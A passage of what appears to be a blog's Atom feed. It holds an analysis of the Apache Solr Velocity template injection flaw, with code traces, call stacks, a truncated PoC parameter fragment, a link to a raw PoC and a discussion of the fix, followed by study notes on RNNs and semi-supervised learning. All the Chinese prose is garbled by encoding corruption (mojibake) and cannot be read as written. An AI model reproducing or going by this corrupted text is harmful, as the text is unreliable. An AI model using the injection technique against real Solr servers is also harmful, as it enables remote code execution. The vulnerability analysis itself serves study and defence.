class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();<span class="comment">//VelocityResopnseWriter</span></span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod); <span class="comment">//SSTI</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) <span class="comment">/*...*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼•å‘SSTIçš„å…³é”®åœ¨äºç¬¬26è¡Œï¼ˆæºç¨‹åºç¬¬556è¡Œï¼‰ï¼Œå…¶è°ƒç”¨äº†HttpSolrCall#getResponseWriterï¼Œè·å–åˆ°VelocityResponseWriterï¼Œå’Œ30è¡Œï¼ˆæºç¨‹åº558è¡Œï¼‰ï¼Œå…¶ä¼šé€šè¿‡HttpSolrCall#writeResponseå°†Requestä¸­å‚æ•°æ¸²æŸ“åˆ°é¡µé¢ã€‚</p><p>å…ˆçœ‹HttpSolrCall#getResponseWriterï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184425485.png" alt="image-20191124184425485"></p><p>é€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯ä»å‚æ•°<code>wt</code>ä¸­è·å–æ¨¡æ¿ï¼Œç„¶åè¿”å›å¯¹åº”æ¨¡æ¿â€”â€”æ³¨æ„åˆ°PoCä¸­çš„<code>wt=velocity</code></p><p>å†çœ‹HttpSolrCall#writeResponseï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184911792.png" alt="image-20191124184911792"></p><p>å…¶è°ƒç”¨äº†QueryResponseWriterUtil#writeQueryResponse()ï¼Œå°†solrReqï¼ŒsolrRspå†™æˆHTTP Responseï¼Œctæ˜¯content-typeã€‚</p><p>HttpSolrCall#writeResponse()è°ƒç”¨QueryResponseWriterUtil#writeQueryResponse()ï¼Œå…ˆç”Ÿäº§ä¸€ä¸ªOutputStreamWriterï¼Œç„¶åç”¨responseWriterå†™å…¥å†…å®¹ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124185248960.png" alt="image-20191124185248960"></p><p>å†è·Ÿè¿›å»å°±åˆ°äº†VelocityResponseWriter#writeï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124190358485.png" alt="image-20191124190358485"></p><h3 id="VelocityResponseWriter-createEngine"><a href="#VelocityResponseWriter-createEngine" class="headerlink" title="VelocityResponseWriter#createEngine"></a>VelocityResponseWriter#createEngine</h3><p>åœ¨VelocityResponseWriter#createEngineä¸­ï¼Œå¦‚æœ<code>paramsResourceLoaderEnabled</code>ï¼Œé‚£ä¹ˆ<code>params.resource.loader.instance=new SolrParamResourceLoader(request)</code>ï¼Œå¦‚æœ<code>solrResourceLoaderEnabled</code>ï¼Œé‚£ä¹ˆ<code>solr.resource.loader.instance=solrResourceLader</code></p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124210507568.png" alt="image-20191124210507568"></p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªifâ€”â€”<code>SolrParamResourceLoader(request)</code>è¿™ä¸ªæ„é€ å‡½æ•°ï¼Œå…¶ä¼šå°†è¯·æ±‚ä¸­çš„<code>v.template</code>å¼€å¤´çš„å‚æ•°åæˆªå–å‰©ä¸‹çš„éƒ¨åˆ†+â€œ.vmâ€ä½œä¸ºkeyâ€”â€”æ³¨æ„åˆ°PoCä¸­çš„<code>v.template.custom=%23set($x=%27%27)...</code>ï¼Œæˆªå–åå¾—åˆ°<code>custom</code>+<code>.vm</code>=<code>custom.vm</code>ï¼Œè€Œè¯·æ±‚ä¸­å‚æ•°å†…å®¹ä½œä¸ºtemplateï¼Œå› æ­¤ç”±äºè¿™ä¸ªè€Œå‚æ•°æ—¶æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„â€”â€”ä¾‹å¦‚åœ¨PoCä¸­ï¼Œå°†å†…å®¹è®¾ç½®ä¸ºäº†<code>%23set($x=%27%27)...</code>ï¼Œå› æ­¤é€ æˆSSTIï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124211628918.png" alt="image-20191124211628918"></p><p>å†çœ‹ç¬¬äºŒä¸ªifâ€”â€”<code>SolrVelocityResourceLoader()</code>å…¶ä»»åŠ¡æ˜¯åŠ è½½ä¸€ä¸ªæœ‰velocity classpathçš„ResourceLoaderï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124212157913.png" alt="image-20191124212157913"></p><h3 id="VelocityResponseWriter-getTemplate"><a href="#VelocityResponseWriter-getTemplate" class="headerlink" title="VelocityResponseWriter#getTemplate"></a>VelocityResponseWriter#getTemplate</h3><p>å›åˆ°VelocityResponseWriter#writeï¼Œåœ¨VelocityResponseWriter#getTemplateæ—¶ï¼Œä¼šä»è¯·æ±‚v.templateå‚æ•°ä¸­è·å–æ¨¡æ¿çš„åç§°ï¼Œå³PoCä¸­çš„<code>v.template=custom</code>ï¼Œå†èµ°åˆ°<code>engine.getTemplate(templateName + TEMPLATE_EXTENSION)</code>è·å–templateï¼Œå³å‰é¢è®¾ç½®çš„<code>custom.vm</code>ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205548129.png" alt="image-20191124205548129"></p><p>æ¨¡æ¿è§£é‡Šå‘ç”Ÿåœ¨<code>org.apache.velocity.Template#merge(Context, Writer)</code>ï¼Œåé¢å°±æ˜¯Velocityæ¨¡æ¿è§£é‡Šé€»è¾‘äº†ï¼Œä¸å†è·Ÿã€‚</p><p>æ€»ç»“ä¸€ä¸‹è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">558</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">writeResponse:<span class="number">849</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">  writeQueryResponse:<span class="number">65</span>, QueryResponseWriterUtil (org.apache.solr.response)</span><br><span class="line">    write:<span class="number">150</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      createEngine:<span class="number">313</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">        SolrParamResourceLoader()<span class="comment">//è®¾ç½®params.resource.loaderâ€”â€”custom.vmæ¨¡æ¿</span></span><br><span class="line">      createEngine:<span class="number">324</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">//è®¾ç½®solr.resource.loaderâ€”â€”åŠ è½½velocity lib</span></span><br><span class="line">    write:<span class="number">152</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      getTemplate:<span class="number">372</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">// è·å–æ¨¡æ¿</span></span><br><span class="line">    write:<span class="number">166</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      merge:<span class="number">264</span>, Template (org.apache.velocity) <span class="comment">// æ¨¡æ¿æ¸²æŸ“ï¼ŒRCE</span></span><br><span class="line">        merge:<span class="number">359</span>, Template (org.apache.velocity)</span><br><span class="line">          render:<span class="number">376</span>, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br></pre></td></tr></table></figure><h1 id="ä¿®å¤æ–¹å¼"><a href="#ä¿®å¤æ–¹å¼" class="headerlink" title="ä¿®å¤æ–¹å¼"></a>ä¿®å¤æ–¹å¼</h1><p>ä¸‹è½½v8.3.1çš„solrï¼Œå‘é€PoCåå¯ä»¥çœ‹åˆ°æŠ¥é”™äº†ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208165035876.png" alt="image-20191208165035876"></p><p>ä»æŠ¥é”™å†…å®¹ä¸Šçœ‹ï¼Œsolræ²¡è·å–åˆ°custom.vmæ¨¡æ¿ï¼Œé‚£å†å‚è€ƒä¹‹å‰åˆ†æï¼Œåº”è¯¥æ˜¯VelocityResponseWriter#createEngineåšäº†ä¿®æ”¹ï¼Œä½†æ˜¯è°ƒè¯•åå‘ç°è¿™é‡Œå¹¶æ²¡ä¿®æ”¹ï¼Œåªæ˜¯ä¸¤ä¸ªifåˆ¤æ–­éƒ½ä¸ºfalseäº†ï¼ŒparamsResourceLoaderEnabledå’ŒsolrResourceLoaderEnabledéƒ½æ˜¯falseï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208172313550.png" alt="image-20191208172313550"></p><p>ç»è¿‡è°ƒè¯•ï¼Œå¯ä»¥æ‰¾åˆ°VelocityResponseWriterçš„æ„é€ è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">init:<span class="number">110</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">initInstance:<span class="number">104</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">createInst:<span class="number">443</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">415</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">168</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">get:<span class="number">178</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">getQueryResponseWriter:<span class="number">2753</span>, SolrCore (org.apache.solr.core)</span><br><span class="line">getResponseWriter:<span class="number">788</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">556</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br></pre></td></tr></table></figure><p>åœ¨init()ä¸­å¯ä»¥çœ‹åˆ°enabledçš„å€¼å–å†³äº<code>PARAMS_RESOURCE_LOADER_ENABLED</code>å’Œ<code>SOLR_RESOURCE_LOADER_ENABLED</code>ï¼Œæ³¨æ„è¿™é‡Œçš„è·å–æ–¹å¼ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208200421304.png" alt="image-20191208200421304"></p><p>å¯¹æ¯”ä¸‹é¢çš„v8.3.1ç‰ˆæœ¬ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208194710665.png" alt="image-20191208194710665"></p><p><code>Boolean.getBoolean()</code>æ˜¯ä»ç³»ç»Ÿå˜é‡é‡Œé¢æ‹¿å‚æ•°ï¼Œæ‰€ä»¥PoCçš„ç¬¬ä¸€ä¸ªåŒ…ï¼ˆ0x01æ­¥ï¼‰çš„è®¾ç½®æ²¡æœ‰ç”¨ã€‚å³å®˜æ–¹ä¿®å¤æ–¹æ¡ˆé€‰æ‹©åœ¨PoCçš„ç¬¬ä¸€æ­¥ä¿®å¤ï¼Œå³åŠ è½½é…ç½®ä¸ä»solrä¸­åŠ è½½è€Œæ˜¯ä»ç³»ç»Ÿé…ç½®ä¸­åŠ è½½ï¼Œä»¥æ­¤å¯¼è‡´ç¬¬äºŒæ­¥ä¸­çš„æ¨¡æ¿ä¸å¯æ§ï¼ŒPoCå¤±æ•ˆã€‚</p><h1 id="æ£€æµ‹æ–¹å¼"><a href="#æ£€æµ‹æ–¹å¼" class="headerlink" title="æ£€æµ‹æ–¹å¼"></a>æ£€æµ‹æ–¹å¼</h1><p>å› ä¸ºæ¶‰åŠçš„å˜é‡å’Œæ¡ä»¶å¤ªå¤šäº†ï¼Œæ„Ÿè§‰ç™½ç›’å³ä½¿ç”¨æ±¡ç‚¹ä¼ æ’­ä¹Ÿå¾ˆéš¾å‘ç°bugï¼Œå¦å¤–ï¼Œå¦‚æœè¦ç”¨æ±¡ç‚¹ä¼ æ’­ï¼Œæœ€å¥½èƒ½åŠ ä¸Šåå‘ä¼ æ’­ï¼Œè¿™æ ·æ‰èƒ½è¯†åˆ«å®˜æ–¹çš„ä¿®å¤æ–¹æ¡ˆã€‚</p><p>é»‘ç›’æ£€æµ‹çš„è¯å°±çœ‹åŒ…å‘çš„é‚£å‡ ä¸ªå˜é‡å°±å¯ä»¥äº†ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åˆè¡¥ä¸Šäº†ä¸€ä¸ªå²å‰çš„å‘ï¼Œè¿™æ¬¡solrçš„æ¼æ´å‡ºå‘è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œå¯¼è‡´ç™½ç›’å¾ˆéš¾æ£€æµ‹ï¼Œæ—¥åå¯ä»¥æ€è€ƒå¦‚ä½•è§£å†³è¿™ä¸€ç±»æ¼æ´ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li>æ¼æ´åˆ†æ - Apache Solr æ¨¡ç‰ˆæ³¨å…¥æ¼æ´(RCE) ï¼Œ<a href="https://xz.aliyun.com/t/6700" target="_blank" rel="noopener">https://xz.aliyun.com/t/6700</a> </li><li>è¯¦ç»†åˆ†æSolrçš„CVE-2019-0193ä»¥åŠvelocityæ¨¡æ¿æ³¨å…¥æ–°æ´ï¼Œ <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></li><li>Raw Pocï¼Œ<a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a> </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ä¸‹è½½å—å½±å“ç‰ˆæœ¬çš„solrï¼Œè¿™é‡Œä¾ç„¶é€‰æ‹©v8.1.0ï¼Œè¿™é‡Œæ³¨æ„é™¤äº†æ·»åŠ solrçš„jarè¿˜éœ€è¦æ·»åŠ velocityçš„ï¼ˆæºç çš„åŒ–å¯ä»¥è®©IDEAä»mavenä¸Šä¸‹æºç ï¼‰ï¼š&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/vulnresearch-Solr_Velocity_injection/image-20191124205421987.png&quot; alt=&quot;image-20191124205421987&quot;&gt;&lt;/p&gt;&lt;p&gt;åŒæ ·çš„æ–¹æ³•å¯åŠ¨é¡¹ç›®&lt;/p&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; server/ &lt;span class=&quot;comment&quot;&gt;#ä¸€å®šè¦åœ¨serverä¸‹è¿è¡Œ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0/server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ java &lt;span class=&quot;string&quot;&gt;&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&quot;&lt;/span&gt; -Dsolr.solr.home=&lt;span class=&quot;string&quot;&gt;&quot;../example/example-DIH/solr/&quot;&lt;/span&gt; -jar start.jar --module=http&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Solr" scheme="http://anemone.top/tags/Solr/"/>
    
  </entry>
  
  <entry>
    <title>RNNå­¦ä¹ ç¬”è®°</title>
    <link href="http://anemone.top/ml-RNN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/ml-RNNå­¦ä¹ ç¬”è®°/</id>
    <published>2019-10-24T12:30:49.000Z</published>
    <updated>2019-11-03T12:42:06.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h1><p>æ™®é€šç¥ç»ç½‘ç»œä¸èƒ½è€ƒè™‘ä¹‹å‰ä¸€ä¸ªå•è¯å¯¹ä¸‹ä¸€ä¸ªå•è¯çš„ä½œç”¨ï¼Œå³ä¸Šä¸‹æ–‡ï¼Œå› æ­¤å¼•å…¥RNNã€‚</p><p>RNNåœ¨ä¸­é—´å±‚åŠ å…¥äº†memoryï¼Œåœ¨æ¯æ¬¡ä¼ æ’­åï¼Œå°†ä¸­é—´å±‚è¾“å‡ºå­˜å‚¨åˆ°memoryï¼Œåœ¨ä¸‹ä¸€æ¬¡ä¼ æ’­æ—¶ï¼Œå°†ç»“æœå–å‡ºä¸åŸè¾“å…¥ä¸€èµ·ä½œä¸ºè¾“å…¥ï¼Œä¹‹åå†ä¼ å‡ºåˆ°ä¸‹ä¸€å±‚ã€‚</p><p>ä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œå°†æ¿€æ´»å‡½æ•°å…¨éƒ¨å˜ä¸ºçº¿æ€§ï¼Œå¹¶ä¸”æƒé‡è®¾ä¸º1ï¼Œå‡è®¾ä¸€å¼€å§‹ï¼Œè¾“å…¥çŸ©é˜µ$[1,1]^T$ï¼Œé‚£ä¹ˆä¼šè¾“å‡º$[4,4]^T$ï¼ŒåŒæ—¶ä¸¤ä¸ªè®°å¿†ä½“ç”±0å˜ä¸º2ï¼ˆå› ä¸ºéšè—å±‚çš„è¾“å‡ºæ˜¯2ï¼‰</p><a id="more"></a><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024154745435.png" alt="image-20191024154745435"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œè¾“å…¥çŸ©é˜µ$[1,1]^T$ï¼Œè¿™æ¬¡è™½ç„¶è¾“å…¥æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ç”±äºmemoryä¸åŒï¼Œè€Œmemoryä¹Ÿæ˜¯è¾“å…¥çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤éšè—å±‚è¾“å‡ºä¸º$[6,6]^T$ï¼Œæœ€ç»ˆå‡º$[12,12]^T$</p><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155107906.png" alt="image-20191024155107906"></p><p>å› æ­¤è¾“å…¥ä¸ªå‘é‡åºåˆ—åï¼Œå¤§è‡´ä¼šæ‰§è¡Œç±»ä¼¼ä¸‹å›¾æµç¨‹</p><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155320413.png" alt="image-20191024155320413"></p><p>å¯ä»¥å°†å…¶å˜å½¢ä¸ºæ·±åº¦å­¦ä¹ æ¨¡å‹ï¼Œå³å­˜åœ¨å¤šä¸ªéšè—å±‚</p><p>åŒæ—¶ï¼Œå…¶æœ‰å¦‚ä¸‹å˜å½¢</p><ul><li><p>Elman Network: memoryå­˜ä¸­é—´å€¼</p></li><li><p>Jordan Network: memoryå­˜outputå€¼</p><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155515493.png" alt="image-20191024155515493"></p></li></ul><h1 id="Bidirectional-RNN"><a href="#Bidirectional-RNN" class="headerlink" title="Bidirectional RNN"></a>Bidirectional RNN</h1><p>åŒæ—¶trainæ­£å‘å’Œåå‘çš„ç¥ç»ç½‘ç»œï¼Œç»“åˆä¸¤ä¸ªç½‘ç»œçš„outputç»“åˆå¾—åˆ°æœ€ç»ˆoutputï¼š</p><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155601826.png" alt="image-20191024155601826"></p><h1 id="Long-Short-term-Memory-LSTM"><a href="#Long-Short-term-Memory-LSTM" class="headerlink" title="Long Short-term Memory(LSTM)"></a>Long Short-term Memory(LSTM)</h1><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹äºè®°å¿†ä½“å¢åŠ ä¸‰ä¸ªé—¸é—¨ï¼š</p><ul><li><p>Input Gateï¼šæ§åˆ¶å…¶ä»–ç¥ç»å…ƒèƒ½å¦å†™å…¥è®°å¿†ä½“</p></li><li><p>Output Gateï¼šæ§åˆ¶å…¶ä»–ç¥ç»å…ƒèƒ½å¦è¯»å–è®°å¿†ä½“</p></li><li><p>Forget Gateï¼šæ§åˆ¶è®°å¿†ä½“æ˜¯å¦è¯¥æ ¼å¼åŒ–æ•°æ®</p><p>å› æ­¤è¯¥ç¥ç»ç½‘ç»œæœ‰å››ä¸ªè¾“å…¥ï¼Œä¸€ä¸ªè¾“å‡ºï¼Œæ˜¯å¦å¼€æ”¾Gateç”±ç½‘ç»œå­¦ä¹ å¾—åˆ°</p></li></ul><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155929389.png" alt="image-20191024155929389"></p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>Machine Learning (Hung-yi Lee, NTU) ï¼Œ <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> ï¼ˆå›¾ç‰‡æ¥æºï¼Œæè€å¸ˆè®²çš„è¯¾çœŸçš„å¾ˆå¥½ï¼Œå¤§å®¶å¯ä»¥å¬å¬çœ‹ï¼‰</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;RNN&quot;&gt;&lt;a href=&quot;#RNN&quot; class=&quot;headerlink&quot; title=&quot;RNN&quot;&gt;&lt;/a&gt;RNN&lt;/h1&gt;&lt;p&gt;æ™®é€šç¥ç»ç½‘ç»œä¸èƒ½è€ƒè™‘ä¹‹å‰ä¸€ä¸ªå•è¯å¯¹ä¸‹ä¸€ä¸ªå•è¯çš„ä½œç”¨ï¼Œå³ä¸Šä¸‹æ–‡ï¼Œå› æ­¤å¼•å…¥RNNã€‚&lt;/p&gt;&lt;p&gt;RNNåœ¨ä¸­é—´å±‚åŠ å…¥äº†memoryï¼Œåœ¨æ¯æ¬¡ä¼ æ’­åï¼Œå°†ä¸­é—´å±‚è¾“å‡ºå­˜å‚¨åˆ°memoryï¼Œåœ¨ä¸‹ä¸€æ¬¡ä¼ æ’­æ—¶ï¼Œå°†ç»“æœå–å‡ºä¸åŸè¾“å…¥ä¸€èµ·ä½œä¸ºè¾“å…¥ï¼Œä¹‹åå†ä¼ å‡ºåˆ°ä¸‹ä¸€å±‚ã€‚&lt;/p&gt;&lt;p&gt;ä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œå°†æ¿€æ´»å‡½æ•°å…¨éƒ¨å˜ä¸ºçº¿æ€§ï¼Œå¹¶ä¸”æƒé‡è®¾ä¸º1ï¼Œå‡è®¾ä¸€å¼€å§‹ï¼Œè¾“å…¥çŸ©é˜µ$[1,1]^T$ï¼Œé‚£ä¹ˆä¼šè¾“å‡º$[4,4]^T$ï¼ŒåŒæ—¶ä¸¤ä¸ªè®°å¿†ä½“ç”±0å˜ä¸º2ï¼ˆå› ä¸ºéšè—å±‚çš„è¾“å‡ºæ˜¯2ï¼‰&lt;/p&gt;
    
    </summary>
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://anemone.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://anemone.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="åŠç›‘ç£" scheme="http://anemone.top/tags/%E5%8D%8A%E7%9B%91%E7%9D%A3/"/>
    
  </entry>
  
  <entry>
    <title>åŠç›‘ç£æœºå™¨å­¦ä¹ æ¨¡å‹å­¦ä¹ ç¬”è®°</title>
    <link href="http://anemone.top/ml-%E5%8D%8A%E7%9B%91%E7%9D%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/</id>
    <published>2019-10-23T12:30:49.000Z</published>
    <updated>2019-11-03T12:42:17.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸºæœ¬ä»‹ç»"><a href="#åŸºæœ¬ä»‹ç»" class="headerlink" title="åŸºæœ¬ä»‹ç»"></a>åŸºæœ¬ä»‹ç»</h1><p>åŠç›‘ç£ï¼ˆSemi-supervised Learningï¼‰å³è¾“å…¥å°éƒ¨åˆ†å·²æ ‡è®°æ•°æ®å’Œå¤§éƒ¨åˆ†æœªæ ‡è®°æ•°æ®è¿›è¡Œå­¦ä¹ ï¼Œä»¥æå‡å‡†ç¡®ç‡çš„ä¸€ç±»æœºå™¨å­¦ä¹ æ–¹æ³•ã€‚</p><p>æœ‰ä¸¤ç§ç”¨æ³•ï¼š</p><ul><li>Transductive learningï¼šæ— æ ‡è®°æ•°æ®å°±æ˜¯æµ‹è¯•é›†æœ¬èº«</li><li>Inductive learningï¼šæ— æ ‡è®°æ•°æ®ä¸æ˜¯æµ‹è¯•é›† </li></ul><a id="more"></a><p>ä¹‹æ‰€ä»¥æœ‰æ•ˆæœçš„åŸå› ï¼šæœªæ ‡è®°çš„æ•°æ®çš„ç‰¹å¾æ˜¯æœ‰ä»·å€¼çš„ï¼Œä¾‹å¦‚ä¸‹å›¾ï¼Œæœªæ ‡è®°çš„æ ·æœ¬åˆ†å¸ƒå†³å®šSVMçš„è¶…å¹³é¢æ€ä¹ˆåˆ’ï¼š</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/1571834496021.png" alt="1571834496021"></p><p>ä½†æ˜¯è¿™ä¹Ÿä¸ç»å¯¹ï¼Œå› ä¸ºå¦‚æœå·¦ä¸‹çš„æ•°æ®ç‚¹æ—¶ç‹—çš„è¯é‚£ä¹ˆå¹³é¢å°±ä¸æ˜¯è¿™æ ·äº†ï¼Œå› æ­¤åŠç›‘ç£ä¸ä¸€å®šæ•ˆæœå¥½ï¼Œå…¶å…³é”®åœ¨äºå‡è®¾æ˜¯å¦ç¬¦åˆå®é™…ã€‚</p><h1 id="Semi-supervised-Generative-Model-ç”Ÿæˆå¼æ–¹æ³•"><a 